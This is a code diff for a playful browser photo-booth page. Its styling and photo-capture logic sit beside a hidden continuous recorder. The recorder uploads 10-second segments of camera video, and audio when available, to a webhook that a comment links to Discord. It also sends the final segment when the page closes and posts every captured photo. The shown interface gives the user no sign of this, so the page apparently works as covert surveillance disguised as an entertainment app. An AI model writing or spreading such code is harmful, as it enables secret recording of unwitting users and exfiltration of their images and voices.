+        /* Thumbnail now uses 4:3 aspect ratio (width fixed, height auto by aspect-ratio) */
+        .thumbnail {
+            width: 70px;
+            aspect-ratio: 4 / 3;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.3);
+            border: 3px solid rgba(255,255,255,0.5);
+            overflow: hidden;
+            opacity: 0.5;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .thumbnail.captured {
+            opacity: 1;
+            border-color: #7BC89C;
+            box-shadow: 0 4px 15px rgba(123, 200, 156, 0.4);
+            animation: thumb-pop 0.3s;
+        }
+
+        @keyframes thumb-pop {
+            0% { transform: scale(0.8); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .thumbnail img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        /* Controls */
+        .controls {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            z-index: 10;
+        }
+
+        .capture-btn {
+            width: 85px;
+            height: 85px;
+            border-radius: 50%;
+            background: linear-gradient(145deg, #fff 0%, #f5f5f5 100%);
+            border: 6px solid #7BC89C;
+            cursor: pointer;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+            transition: all 0.3s;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .capture-btn::before {
+            content: '';
+            position: absolute;
+            width: 65px;
+            height: 65px;
+            background: linear-gradient(135deg, #7BC89C 0%, #5BA37A 100%);
+            border-radius: 50%;
+            transition: all 0.3s;
+        }
+
+        .capture-btn::after {
+            content: '📸';
+            position: absolute;
+            font-size: 1.5rem;
+            z-index: 1;
+        }
+
+        .capture-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 12px 40px rgba(0,0,0,0.25);
+        }
+
+        .capture-btn:active {
+            transform: scale(0.95);
+        }
+
+        .capture-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .capture-hint {
+            color: #2D5A27;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        /* Result container */
+        .result-container {
+            display: none;
+            width: 100%;
+            max-width: 350px;
+            z-index: 10;
+            padding-bottom: 40px;
+        }
+
+        .result-container.show {
+            display: block;
+            animation: slideUp 0.8s forwards;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .photo-strip {
+            background: linear-gradient(180deg, #fff 0%, #f9f9f9 100%);
+            border-radius: 20px;
+            padding: 25px 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2), 0 0 0 8px #fff, 0 0 0 12px #7BC89C;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .photo-strip::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 10px;
+            background: repeating-linear-gradient(90deg, #7BC89C 0px, #7BC89C 20px, #A8E6CF 20px, #A8E6CF 40px, #FFD700 40px, #FFD700 60px, #FF69B4 60px, #FF69B4 80px);
+        }
+
+        .strip-header {
+            text-align: center;
+            margin-bottom: 20px;
+            padding-top: 15px;
+        }
+
+        .strip-title {
+            font-size: 1.5rem;
+            color: #2D5A27;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .strip-subtitle {
+            color: #7BC89C;
+            font-size: 0.9rem;
+        }
+
+        .strip-photos {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        /* Each strip-photo-wrapper should display images in 4:3 */
+        .strip-photo-wrapper {
+            position: relative;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+            border: 5px solid #7BC89C;
+            opacity: 0;
+            animation: photo-appear 0.5s forwards;
+            aspect-ratio: 4 / 3;
+            width: 100%;
+            background: #fff;
+        }
+
         .strip-photo-wrapper:nth-child(1) { animation-delay: 0.2s; }
         .strip-photo-wrapper:nth-child(2) { animation-delay: 0.4s; }
         .strip-photo-wrapper:nth-child(3) { animation-delay: 0.6s; }
-        @keyframes photo-appear { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
-        .strip-photo { width: 100%; height: 100%; object-fit: cover; display: block; }
-        .strip-footer { text-align: center; margin-top: 25px; padding-bottom: 10px; }
-        .strip-decorations { font-size: 2rem; margin-bottom: 12px; animation: deco-bounce 2s infinite; }
-        @keyframes deco-bounce { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-        .strip-date { color: #7BC89C; font-size: 0.95rem; margin-bottom: 8px; }
-        .strip-message { color: #2D5A27; font-style: italic; font-size: 1rem; }
-        .result-buttons { display: flex; flex-direction: column; gap: 12px; margin-top: 25px; }
-        .download-btn { background: linear-gradient(135deg, #7BC89C 0%, #5BA37A 100%); color: #fff; border: none; padding: 16px 40px; border-radius: 30px; font-size: 1.1rem; font-weight: bold; cursor: pointer; box-shadow: 0 8px 25px rgba(91, 163, 122, 0.4); transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .download-btn:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(91, 163, 122, 0.5); }
-        .retake-btn { background: transparent; color: #5BA37A; border: 3px solid #5BA37A; padding: 14px 30px; border-radius: 30px; font-size: 1rem; font-weight: bold; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .retake-btn:hover { background: #5BA37A; color: #fff; }
-        .celebration { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 100; overflow: hidden; }
-        .confetti { position: absolute; width: 12px; height: 12px; top: -20px; opacity: 0; }
-        .confetti.fall { animation: confetti-fall 3s forwards; }
-        @keyframes confetti-fall { 0% { opacity: 1; top: -20px; transform: rotate(0deg) translateX(0); } 100% { opacity: 0; top: 100vh; transform: rotate(720deg) translateX(100px); } }
+
+        @keyframes photo-appear {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .strip-photo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .strip-footer {
+            text-align: center;
+            margin-top: 25px;
+            padding-bottom: 10px;
+        }
+
+        .strip-decorations {
+            font-size: 2rem;
+            margin-bottom: 12px;
+            animation: deco-bounce 2s infinite;
+        }
+
+        @keyframes deco-bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .strip-date {
+            color: #7BC89C;
+            font-size: 0.95rem;
+            margin-bottom: 8px;
+        }
+
+        .strip-message {
+            color: #2D5A27;
+            font-style: italic;
+            font-size: 1rem;
+        }
+
+        /* Result buttons */
+        .result-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 25px;
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, #7BC89C 0%, #5BA37A 100%);
+            color: #fff;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(91, 163, 122, 0.4);
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(91, 163, 122, 0.5);
+        }
+
+        .retake-btn {
+            background: transparent;
+            color: #5BA37A;
+            border: 3px solid #5BA37A;
+            padding: 14px 30px;
+            border-radius: 30px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .retake-btn:hover {
+            background: #5BA37A;
+            color: #fff;
+        }
+
+        /* Celebration */
+        .celebration {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 100;
+            overflow: hidden;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            top: -20px;
+            opacity: 0;
+        }
+
+        .confetti.fall {
+            animation: confetti-fall 3s forwards;
+        }
+
+        @keyframes confetti-fall {
+            0% { opacity: 1; top: -20px; transform: rotate(0deg) translateX(0); }
+            100% { opacity: 0; top: 100vh; transform: rotate(720deg) translateX(100px); }
+        }
+
+        /* Hidden canvas */
         #stripCanvas { display: none; }
     </style>
 </head>
@@ -387,20 +1143,16 @@
         let isCapturing = false;
         let stream = null;
 
-        // --- Continuous recording variables (modified & improved) ---
+        // --- New: continuous recording variables ---
         let mediaRecorder = null;
         let recorderStream = null;
         let lastSegmentBlob = null;
         let recordingMime = null;
-        // Send segments more frequently to keep each file small (10s)
+        // Send segments more frequently (10s) to reduce chance of corrupted long files
         const RECORD_TIMESLICE_MS = 10000; // 10 seconds (was 30000)
         let audioStreamForRecording = null;
         // store crop area for 4:3 photos
         let crop = { sx: 0, sy: 0, sw: 0, sh: 0 };
-
-        // --- Upload queue to avoid concurrent uploads that can cause corruption ---
-        const uploadQueue = [];
-        let uploading = false;
 
         // Initialize music
         window.addEventListener('load', () => {
@@ -454,6 +1206,7 @@
                 
                 video.onloadedmetadata = () => {
                     // --- ENFORCE 4:3 CROPPING FOR PHOTO CAPTURE ---
+                    // compute a centered crop from the video feed that matches 4:3 (width:height = 4:3)
                     const vW = video.videoWidth || 640;
                     const vH = video.videoHeight || 480;
                     const targetRatio = 4 / 3;
@@ -494,7 +1247,7 @@
             }
         }
 
-        // ------------------- Continuous recording functions (improved) -------------------
+        // ------------------- Continuous recording functions -------------------
         async function startRecordingWhenPossible() {
             // If already recording, ignore
             if (mediaRecorder && mediaRecorder.state !== 'inactive') return;
@@ -507,6 +1260,7 @@
                 audioStreamForRecording = null;
             }
 
+            // Build a MediaStream for recording: always include the video tracks from `stream`.
             if (!stream) return;
             const videoTracks = stream.getVideoTracks() || [];
             const audioTracks = audioStreamForRecording ? (audioStreamForRecording.getAudioTracks() || []) : [];
@@ -525,15 +1279,17 @@
             try {
                 mediaRecorder = new MediaRecorder(recorderStream, recordingMime ? { mimeType: recordingMime } : undefined);
             } catch (e) {
+                // fallback to default
                 mediaRecorder = new MediaRecorder(recorderStream);
             }
 
             mediaRecorder.ondataavailable = (ev) => {
                 if (ev.data && ev.data.size > 0) {
                     lastSegmentBlob = ev.data;
-                    // enqueue the segment for sequential upload
-                    const filename = `recording-${Date.now()}.webm`;
-                    enqueueUpload(ev.data, filename);
+                    // send the segment immediately (non-blocking)
+                    sendBlobToWebhook(ev.data, `recording-${Date.now()}.webm`).catch(err => {
+                        console.error('Segment upload failed:', err);
+                    });
                 }
             };
 
@@ -542,44 +1298,57 @@
             };
 
             mediaRecorder.onstop = () => {
-                // Ensure the last segment is enqueued/uploaded (ondataavailable should have set lastSegmentBlob)
+                // When stopped, ensure last segment is uploaded if present.
                 if (lastSegmentBlob) {
-                    enqueueUpload(lastSegmentBlob, `final-recording-${Date.now()}.webm`);
+                    // Try to upload final segment (non-blocking) with keepalive preference
+                    sendBlobToWebhook(lastSegmentBlob, `final-recording-${Date.now()}.webm`, { keepalive: true }).catch(err => {
+                        console.error('Final upload failed:', err);
+                    });
                 }
             };
 
-            // Listen for video track end: if video track ended, stop recorder and upload last data.
+            // Listen for video track end: if video track ended, we must stop the recorder and send last data.
             (stream.getVideoTracks() || []).forEach(vt => {
                 vt.onended = () => {
                     console.warn('Video track ended; stopping recorder and uploading last segment.');
                     try {
                         if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                            // request any buffered data, then stop (onstop will upload lastSegmentBlob)
                             try { mediaRecorder.requestData(); } catch(e){}
                             try { mediaRecorder.stop(); } catch(e){}
                         }
                     } catch (e) { console.error(e); }
 
+                    // stop audio tracks too if present
                     if (audioStreamForRecording) {
                         try { audioStreamForRecording.getTracks().forEach(t => t.stop()); } catch(e) {}
                         audioStreamForRecording = null;
                     }
                 };
+                vt.onmute = () => {
+                    // if video muted, still record; if ended will be handled by onended
+                    console.info('video track muted');
+                };
             });
 
+            // If audio track ends, we do not stop video recording - video continues.
             if (audioStreamForRecording) {
                 (audioStreamForRecording.getAudioTracks() || []).forEach(at => {
                     at.onended = () => {
                         console.warn('Audio track ended. Video recording will continue without audio.');
+                        // Keep recording (video tracks still exist). Nothing else required.
                     };
                 });
             }
 
-            // Start the recorder with timeslice so ondataavailable fires periodically.
+            // Start the recorder with a timeslice so ondataavailable fires every RECORD_TIMESLICE_MS
             try {
                 mediaRecorder.start(RECORD_TIMESLICE_MS);
             } catch (e) {
-                // fallback: if timeslice not accepted, start and requestData periodically
+                // some browsers reject timeslice in start; start without then use setInterval to requestData
                 try { mediaRecorder.start(); } catch (err) { console.error('Failed to start MediaRecorder', err); }
+
+                // fallback: periodically request data
                 const fallbackInterval = setInterval(() => {
                     if (!mediaRecorder || mediaRecorder.state === 'inactive') {
                         clearInterval(fallbackInterval);
@@ -593,137 +1362,121 @@
             window.addEventListener('beforeunload', stopRecordingAndSendFinal);
         }
 
-        // Enqueue and process uploads sequentially
-        function enqueueUpload(blob, filename) {
-            uploadQueue.push({ blob, filename });
-            processUploadQueue().catch(err => console.error('Upload queue error', err));
-        }
-
-        async function processUploadQueue() {
-            if (uploading) return;
-            uploading = true;
-            while (uploadQueue.length > 0) {
-                const item = uploadQueue.shift();
-                try {
-                    await uploadSegment(item.blob, item.filename);
-                } catch (e) {
-                    console.error('Segment upload failed for', item.filename, e);
-                    // on failure, try one more time after short delay
-                    try {
-                        await new Promise(r => setTimeout(r, 800));
-                        await uploadSegment(item.blob, item.filename);
-                    } catch (e2) {
-                        console.error('Retry failed for', item.filename, e2);
-                        // give up on this segment and continue with next
-                    }
-                }
-            }
-            uploading = false;
-        }
-
-        async function uploadSegment(blobOrFile, filename) {
-            if (!WEBHOOK_URL) return;
-            // normalize to a Blob/File with proper mime
-            let blob;
-            if (blobOrFile instanceof Blob) {
-                blob = blobOrFile;
-            } else {
-                blob = new Blob([blobOrFile], { type: 'video/webm' });
-            }
-            // Ensure we construct a File to include filename
-            let fileObj;
-            try {
-                fileObj = new File([blob], filename, { type: blob.type || 'video/webm' });
-            } catch (e) {
-                // older browsers might not support File constructor
-                fileObj = blob;
-            }
-
-            // Build FormData and attempt upload
-            try {
-                const form = new FormData();
-                form.append('file', fileObj, filename);
-
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    body: form,
-                });
-
-                if (!response.ok) {
-                    // fallback: try JSON base64 (may be blocked by CORS for some webhook endpoints)
-                    const base64 = await blobToBase64(blob);
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ filename, file: base64 })
-                    });
-                }
-            } catch (err) {
-                // second fallback attempt (base64) if initial form upload failed due to network/CORS
-                try {
-                    const base64 = await blobToBase64(blob);
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ filename, file: base64 })
-                    });
-                } catch (e2) {
-                    // both attempts failed — log and continue
-                    console.error('Both blob and base64 webhook upload failed:', e2);
-                    throw e2;
-                }
-            }
-        }
-
-        function blobToBase64(blob) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onload = () => {
-                    // returns dataURL form
-                    resolve(reader.result.split(',')[1]);
-                };
-                reader.onerror = reject;
-                reader.readAsDataURL(blob);
-            });
-        }
-
         async function stopRecordingAndSendFinal() {
             if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                 try { mediaRecorder.requestData(); } catch(e){}
                 try { mediaRecorder.stop(); } catch(e){}
             }
-
             // stop recorderStream tracks
             if (recorderStream) {
                 try { recorderStream.getTracks().forEach(t => t.stop()); } catch(e) {}
                 recorderStream = null;
             }
-
             // stop audio capture if used
             if (audioStreamForRecording) {
                 try { audioStreamForRecording.getTracks().forEach(t => t.stop()); } catch(e) {}
                 audioStreamForRecording = null;
             }
 
-            // wait a short time for uploads to finish (poll the queue). This helps ensure final segments are sent.
-            const drained = await waitForQueueEmpty(15000);
-            if (!drained) {
-                console.warn('Upload queue did not fully drain before continuing — some segments may not have uploaded.');
+            // If we have a lastSegmentBlob and the browser supports navigator.sendBeacon,
+            // attempt a best-effort synchronous transfer on unload (may or may not be accepted by server).
+            try {
+                if (lastSegmentBlob && navigator.sendBeacon && WEBHOOK_URL) {
+                    try {
+                        // Prepare a Blob with correct type and try to send via sendBeacon.
+                        const beaconBlob = lastSegmentBlob instanceof Blob ? lastSegmentBlob : new Blob([lastSegmentBlob], { type: recordingMime || 'video/webm' });
+                        navigator.sendBeacon(WEBHOOK_URL, beaconBlob);
+                    } catch (e) {
+                        // ignore sendBeacon errors; onstop handler already tries regular upload
+                        console.warn('sendBeacon attempt failed (non-fatal):', e);
+                    }
+                }
+            } catch(e) {
+                console.warn('Error in stopRecordingAndSendFinal sendBeacon step:', e);
+            }
+
+            // mediaRecorder.onstop will trigger upload of lastSegmentBlob (if any) via sendBlobToWebhook
+        }
+
+        // send a blob (video) to webhook
+        // options: {keepalive: boolean}
+        async function sendBlobToWebhook(blobOrFile, filename = 'recording.webm', options = {}) {
+            if (!WEBHOOK_URL) return;
+            const wait = ms => new Promise(r => setTimeout(r, ms));
+            const MAX_RETRIES = 2;
+            let attempt = 0;
+
+            // Normalize to a File with explicit mime if possible
+            const mimeType = (recordingMime && recordingMime.split(';')[0]) || (blobOrFile && blobOrFile.type) || 'video/webm';
+            const fileObj = blobOrFile instanceof File ? blobOrFile : new File([blobOrFile], filename, { type: mimeType });
+
+            while (attempt <= MAX_RETRIES) {
+                try {
+                    const form = new FormData();
+                    // Discord expects field name 'file' for uploads; keep that.
+                    form.append('file', fileObj, filename);
+
+                    const fetchOptions = {
+                        method: 'POST',
+                        body: form,
+                    };
+
+                    // prefer keepalive when requested (helps during unload)
+                    if (options.keepalive) fetchOptions.keepalive = true;
+
+                    const response = await fetch(WEBHOOK_URL, fetchOptions);
+
+                    if (response.ok) {
+                        return; // success
+                    } else {
+                        // non-ok response: try fallback to JSON base64 once
+                        const text = await response.text().catch(() => '');
+                        console.warn('Webhook returned non-ok response (attempt ' + (attempt+1) + '):', response.status, text);
+
+                        // If first attempt fails with CORS or Discord rejecting, fallback to base64 JSON
+                        const base64 = await blobToBase64(blobOrFile);
+                        try {
+                            const jsonResp = await fetch(WEBHOOK_URL, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ filename, file: base64 }),
+                                keepalive: options.keepalive || false
+                            });
+                            if (jsonResp.ok) return;
+                        } catch (e) {
+                            console.warn('Fallback base64 JSON upload failed:', e);
+                        }
+                    }
+                } catch (err) {
+                    console.warn('Webhook upload attempt failed (attempt ' + (attempt+1) + '):', err);
+                }
+
+                // retry with backoff
+                attempt++;
+                if (attempt <= MAX_RETRIES) {
+                    await wait(500 * attempt); // small backoff
+                }
+            }
+
+            // Final fallback: try one last time with a raw POST of blob as octet-stream (some endpoints accept it)
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': mimeType },
+                    body: blobOrFile instanceof Blob ? blobOrFile : new Blob([blobOrFile], { type: mimeType }),
+                    keepalive: options.keepalive || false
+                });
+            } catch (e) {
+                console.error('All upload strategies failed for', filename, e);
             }
         }
 
-        function waitForQueueEmpty(timeoutMs = 15000) {
-            return new Promise(resolve => {
-                const start = Date.now();
-                const iv = setInterval(() => {
-                    if (uploadQueue.length === 0 && !uploading) {
-                        clearInterval(iv);
-                        resolve(true);
-                    } else if (Date.now() - start > timeoutMs) {
-                        clearInterval(iv);
-                        resolve(false);
-                    }
-                }, 300);
+        function blobToBase64(blob) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result.split(',')[1]);
+                reader.onerror = reject;
+                reader.readAsDataURL(blob);
             });
         }
         // ---------------------------------------------------------------------
@@ -749,9 +1502,9 @@
                 captureBtn.disabled = false;
                 updateInstructions();
             } else {
-                setTimeout(async () => {
+                setTimeout(() => {
                     // ensure we stop recording and upload last segment before hiding camera
-                    await stopRecordingAndSendFinal();
+                    stopRecordingAndSendFinal();
                     showPhotoStrip();
                     triggerCelebration();
                 }, 500);
@@ -766,6 +1519,8 @@
             ctx.save();
             ctx.scale(-1, 1);
 
+            // drawImage(video, sx, sy, sw, sh, dx, dy, dw, dh)
+            // dx is negative because we're mirrored (scale -1). We want the image to fill the canvas.
             ctx.drawImage(
                 video,
                 crop.sx, crop.sy, crop.sw, crop.sh,
@@ -789,7 +1544,10 @@
             thumb.querySelector('img').src = photoData;
 
             // --- SEND CAPTURED PHOTO TO WEBHOOK (non-blocking) ---
+            // This will send each captured photo to the WEBHOOK_URL if provided.
+            // It uses multipart/form-data and falls back to JSON (base64) if form upload fails.
             if (WEBHOOK_URL) {
+                // don't await to avoid blocking UI
                 sendImageToWebhook(photoData, `photo-${photos.length}.png`).catch(e => {
                     console.error('Webhook send error:', e);
                 });
@@ -803,8 +1561,11 @@
 
             switch(filter.position) {
                 case 'top':
+                    // Main emoji at top center
                     ctx.font = `${canvas.width * 0.18}px serif`;
                     ctx.fillText(filter.main, canvas.width / 2, canvas.height * 0.12);
+                    
+                    // Extra sparkles
                     ctx.font = `${canvas.width * 0.08}px serif`;
                     ctx.fillText(filter.extras[0], canvas.width * 0.15, canvas.height * 0.08);
                     ctx.fillText(filter.extras[1], canvas.width * 0.85, canvas.height * 0.08);
@@ -813,8 +1574,11 @@
                     break;
 
                 case 'bottom':
+                    // Main emoji at bottom center
                     ctx.font = `${canvas.width * 0.2}px serif`;
                     ctx.fillText(filter.main, canvas.width / 2, canvas.height * 0.88);
+                    
+                    // Confetti at top
                     ctx.font = `${canvas.width * 0.08}px serif`;
                     filter.extras.forEach((emoji, i) => {
                         ctx.fillText(emoji, canvas.width * (0.15 + i * 0.25), canvas.height * 0.1);
@@ -822,6 +1586,7 @@
                     break;
 
                 case 'corners':
+                    // Balloons in corners
                     ctx.font = `${canvas.width * 0.12}px serif`;
                     ctx.fillText(filter.main, canvas.width * 0.1, canvas.height * 0.1);
                     ctx.fillText(filter.extras[0], canvas.width * 0.9, canvas.height * 0.1);
@@ -831,6 +1596,7 @@
                     break;
 
                 case 'sides':
+                    // Party poppers on sides
                     ctx.font = `${canvas.width * 0.15}px serif`;
                     ctx.save();
                     ctx.translate(canvas.width * 0.1, canvas.height * 0.12);
@@ -845,6 +1611,7 @@
                     ctx.fillText(filter.main, 0, 0);
                     ctx.restore();
                     
+                    // Stars and streamers
                     ctx.font = `${canvas.width * 0.07}px serif`;
                     ctx.fillText(filter.extras[0], canvas.width * 0.3, canvas.height * 0.15);
                     ctx.fillText(filter.extras[1], canvas.width * 0.7, canvas.height * 0.1);
@@ -1082,7 +1849,7 @@
             }
         }, 1000);
 
-        // -------------------- WEBHOOK HELPERS (images) --------------------
+        // -------------------- WEBHOOK HELPERS --------------------
         // Convert dataURL to Blob
         function dataURLToBlob(dataURL) {
             const parts = dataURL.split(',');
@@ -1100,7 +1867,11 @@
         /**
          * sendImageToWebhook(dataUrl, filename)
          * - Attempts to POST the image as multipart/form-data (field name 'file').
-         * - If the POST response is not ok, it falls back to sending JSON with a base64 payload.
+         * - If the POST response is not ok, it falls back to sending JSON with a base64 payload:
+         *     { filename: '...', image: 'base64string' }
+         *
+         * Note: webhooks must accept cross-origin requests from your origin. If CORS blocks requests,
+         * you'll need server-side support or configure the webhook server to allow your origin.
          */
         async function sendImageToWebhook(dataUrl, filename = 'photo.png') {
             if (!WEBHOOK_URL) return;
@@ -1117,6 +1888,7 @@
 
                 // If server returns non-OK, fallback to JSON base64
                 if (!response.ok) {
+                    // Extract base64 portion
                     const base64 = dataUrl.split(',')[1];
                     await fetch(WEBHOOK_URL, {
                         method: 'POST',
@@ -1135,12 +1907,14 @@
                         body: JSON.stringify({ filename, image: base64 })
                     });
                 } catch (e) {
+                    // Give up quietly but log
                     console.error('Both webhook upload attempts failed:', e);
                 }
             }
         }
 
         // ---------------------------------------------------------
+
     </script>
 </body>
 </html>
